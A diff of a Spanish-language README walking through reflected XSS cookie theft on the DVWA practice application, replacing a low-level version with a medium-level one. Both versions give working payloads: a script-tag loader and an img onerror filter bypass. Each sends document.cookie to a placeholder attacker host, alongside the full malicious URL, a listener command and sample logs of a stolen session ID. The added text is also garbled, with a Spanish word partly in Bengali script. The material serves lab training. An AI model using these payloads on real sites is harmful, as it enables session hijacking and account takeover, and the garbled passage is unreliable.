@@ -1,66 +1,71 @@
-# Explotación XSS Reflejado de Nivel Bajo para Robo de Cookies
+# Explotación de Vulnerabilidad XSS (Cross-Site Scripting) - Nivel Medio
 
-Este repositorio contiene los archivos y la explicación para realizar una explotación de Cross-Site Scripting (XSS) reflejado de nivel bajo con el objetivo de robar cookies de sesión. Este ejemplo se enfoca en la página de selección de idioma de la aplicación web vulnerable DVWA (Damn Vulnerable Web Application).
+## Objetivo
 
-**Advertencia:** Esta información se proporciona únicamente con fines educativos y de prueba de penetración en entornos controlados. El uso de estas técnicas sin permiso explícito es ilegal y puede tener consecuencias graves.
+Robar la cookie de un usuario conectado explotando una vulnerabilidad Cross-Site Scripting (XSS) de nivel medio.
 
 ## Herramientas Necesarias
 
-* **Navegador web:** Para acceder a la página vulnerable y verificar la explotación.
-* **Kali Linux (o cualquier sistema con Python instalado):** Necesario para levantar un servidor web temporal y analizar los logs.
-* **Acceso a la página web vulnerable:** En este caso, la página de selección de idioma de DVWA.
+* Un entorno web vulnerable (por ejemplo, DVWA - Damn Vulnerable Web Application).
+* Kali Linux (o cualquier sistema con Python instalado).
 
 ## Pasos para la Explotación
 
-1.  **Levantar un Servidor Web Temporal en Kali:**
-    Abre una terminal en tu máquina Kali Linux y ejecuta el siguiente comando para iniciar un servidor web simple en el puerto 9999:
+1.  **Iniciar un servidor web temporal en Kali Linux:**
+    Abre tu terminal en Kali Linux y ejecuta el siguiente comando para iniciar un servidor web simple en el puerto 9999. Este servidor escuchará las peticiones que envíe la página vulnerable.
+
     ```bash
-    python -m SimpleHTTPServer 9999
-    ```
-    Mantén esta terminal abierta para registrar las peticiones entrantes.
-
-2.  **Crear el Payload en un Archivo JavaScript (`a.js`):**
-    Crea un nuevo archivo de texto llamado `a.js` en el directorio desde donde ejecutaste el comando `SimpleHTTPServer`. Pega el siguiente código JavaScript dentro del archivo, reemplazando `[tu_IP_de_Kali]` con la dirección IP de tu máquina Kali Linux (puedes encontrarla con `ifconfig` o `ip addr`):
-    ```javascript
-    function getimg() {
-      var img = document.createElement('img');
-      img.src = 'http://[tu_IP_de_Kali]:9999/' + document.cookie;
-      document.body.appendChild(img);
-    }
-
-    getimg();
-    ```
-    Guarda el archivo `a.js`.
-
-3.  **Construir la URL Maliciosa:**
-    Identifica la URL vulnerable. Para el nivel bajo de XSS reflejado en la página de selección de idioma de DVWA, la URL base es similar a:
-    ```
-    http://dvwa/dvwa/vulnerabilities/xss_d/
-    ```
-    Modifica el parámetro `default` en la URL para inyectar la etiqueta `<script>` que carga tu archivo `a.js` desde tu servidor web temporal. La URL final debería tener la siguiente estructura (asegúrate de reemplazar `[tu_IP_de_Kali]` con tu IP):
-    ```
-    http://dvwa/dvwa/vulnerabilities/xss_d/?default=<script src="http://[tu_IP_de_Kali]:9999/a.js"></script>
+    sudo python3 -m http.server 9999
     ```
 
-4.  **Enviar la URL Maliciosa a la Víctima (o Acceder a Ella):**
-    Para probar la explotación, puedes simplemente pegar la URL modificada en la barra de direcciones de tu propio navegador web (si estás probando en un entorno local con DVWA configurado). En un escenario real, un atacante podría emplear diversas técnicas de ingeniería social para que la víctima acceda a este enlace.
+2.  **Analizar las protecciones de nivel Medio:**
+    A diferencia del nivel Bajo, el nivel Medio bloquea la cadena `<script`. Esto significa que los payloads directos que utilizaban la etiqueta `<script>` ya no funcionarán.
 
-5.  **Verificar los Logs del Servidor Web Temporal:**
-    Regresa a la terminal donde está ejecutándose tu servidor web en Kali. Si la explotación es exitosa, verás una o más peticiones HTTP en los logs del servidor. Busca una petición `GET` que contenga la cookie de la víctima en la URL solicitada. Debería verse algo parecido a:
+3.  **Construir un payload XSS sin la etiqueta `<script>`:**
+    Para বাইপাসar esta restricción, utilizaremos la etiqueta `<img>` con un evento `onerror` para ejecutar código JavaScript.
+
+4.  **Payload final para robar la cookie:**
+    Dado que la entrada se inyecta en la primera opción de un desplegable (`<select>`), necesitamos "romper" la estructura HTML del dropdown para que nuestra etiqueta `<img>` se renderice correctamente y el código JavaScript se ejecute. El siguiente payload logra esto:
+
+    ```html
+    </option></select><img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")>
     ```
-    [timestamp] "GET /[COOKIE_DE_LA_VICTIMA] HTTP/1.1" 404 -
+
+    **Desglose del payload:**
+
+    * `</option></select>`: Cierra la etiqueta `<option>` actual y la etiqueta `<select>` del desplegable, sacándonos de su estructura.
+    * `<img id='pic'`: Crea una etiqueta `<img>` con el ID `pic`.
+    * `src=x`: Establece un valor inválido para el atributo `src`. Cualquier valor no válido para una imagen provocará un error.
+    * `onerror="..."`: Define el código JavaScript que se ejecutará cuando ocurra un error al cargar la imagen (debido al `src` inválido).
+        * `var i = document.getElementById('pic');`: Obtiene la referencia al elemento `<img>` por su ID.
+        * `i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie);`: Establece el atributo `src` de la imagen a una URL en tu servidor web temporal (reemplaza `[tu_IP_de_Kali]` con la IP de tu máquina Kali) seguido de la cookie del usuario (`document.cookie`). Esto hará que el navegador de la víctima intente cargar una "imagen" desde tu servidor, enviando la cookie en la petición GET.
+        * `i.parentNode.removeChild(i);`: Elimina la etiqueta `<img>` del DOM para evitar que el evento `onerror` se siga disparando repetidamente, lo que podría generar múltiples peticiones a tu servidor.
+        * `return false;`: Evita que el error de la imagen se propague.
+    * `>`: Cierra la etiqueta `<img>`.
+
+5.  **Construir la URL maliciosa:**
+    Combina la URL de la página vulnerable con el payload inyectado en el parámetro `default`:
+
     ```
-    La parte `[COOKIE_DE_LA_VICTIMA]` representa la cookie de sesión del usuario que accedió a la URL maliciosa. ¡La cookie ha sido robada!
+    http://dvwa/dvwa/vulnerabilities/xss_d/?default=English</option></select><img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")>
+    ```
 
-## Explicación de lo que Sucede
+    **¡Importante!** Reemplaza `[tu_IP_de_Kali]` con la dirección IP de tu máquina Kali.
 
-1.  Cuando la víctima hace clic en el enlace malicioso o accede a la URL, el navegador web interpreta la etiqueta `<script>` inyectada en el parámetro `default`.
-2.  Esto provoca que el navegador realice una petición HTTP al servidor web temporal que configuraste en Kali (en el puerto 9999) para obtener el archivo `a.js`.
-3.  Tu servidor web en Kali responde sirviendo el contenido del archivo `a.js`.
-4.  El código JavaScript dentro de `a.js` se ejecuta en el contexto del navegador de la víctima.
-5.  La función `getimg()` crea dinámicamente un nuevo elemento `<img>`.
-6.  La propiedad `src` de esta imagen se establece a una URL en tu servidor web de Kali, anexando el valor de `document.cookie` (que contiene las cookies del sitio web actual de la víctima) como parte de la ruta de la "imagen".
-7.  El navegador de la víctima intenta cargar esta "imagen" desde tu servidor web en Kali.
-8.  La petición HTTP enviada por el navegador de la víctima a tu servidor web incluye la cookie robada en la URL solicitada, la cual queda registrada en los logs de tu servidor web temporal.
+6.  **Acceder a la URL maliciosa:**
+    Pega esta URL en el navegador de la víctima (o en tu propio navegador si estás probando la vulnerabilidad).
 
-Este ejemplo ilustra una vulnerabilidad XSS reflejada básica y cómo un atacante puede explotarla para robar información sensible como las cookies de sesión. En escenarios reales, las consecuencias de un robo de cookies pueden ser graves, permitiendo al atacante hacerse pasar por la víctima.
+7.  **Verificar el servidor web temporal:**
+    Si la explotación es exitosa, tu servidor web temporal en Kali Linux debería recibir una petición GET. La ruta de esta petición contendrá la cookie del usuario conectado. Deberías ver algo similar a esto en los logs de tu servidor:
+
+    ```
+    192.168.x.x - - [DD/Mon/YYYY HH:MM:SS] "GET /PHPSESSID=alguna_sesion;security=medium HTTP/1.1" 200 -
+    ```
+
+    La parte después de `/` es la cookie del usuario.
+
+## ¡Felicidades!
+
+Has explotado con éxito la vulnerabilidad XSS de nivel Medio para robar la cookie de un usuario utilizando un payload que বাইপাসa la restricción de la etiqueta `<script>`.
+
+**Recuerda:** Esta demostración es con fines educativos en un entorno controlado. En escenarios reales, las protecciones pueden ser más robustas. El uso de esta información para actividades maliciosas es ilegal y no ético.
